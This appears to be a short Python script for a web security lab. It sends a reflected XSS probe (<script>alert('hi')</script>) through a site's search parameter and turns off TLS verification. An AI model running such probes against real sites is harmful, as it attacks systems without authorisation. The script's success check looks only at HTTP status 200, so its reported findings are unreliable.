try:
    import requests, sys
    from pathlib import Path
    sys.path.append(str(Path(__file__).parent.parent))
    from config import parse_args, is_success
except ImportError as e:
    print(e)

class Xss:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        args, proxy = parse_args()
        if proxy:
            self.session.proxies.update(proxy)
        self.session.verify = False

    def no_encoding(self):
        try:
            exploit_url = f"{self.url}/?search="
            if self.session.get(f"{exploit_url}<script>alert('hi')</script>").status_code != 200:
                return False
            return True
        except Exception as e:
            print(e)
            return False

    def main(self):
        vulnerabilities = [
            ("XSS with no encoding", self.no_encoding)
        ]
        for vulnerability_title, vulnerability_method in vulnerabilities:
            if vulnerability_method():
                print(f"{vulnerability_title} is success")
            else:
                print("nope")

if __name__ == "__main__":
    url = input("Enter the url to exploit: ")
    xss = Xss(url)
    xss.main()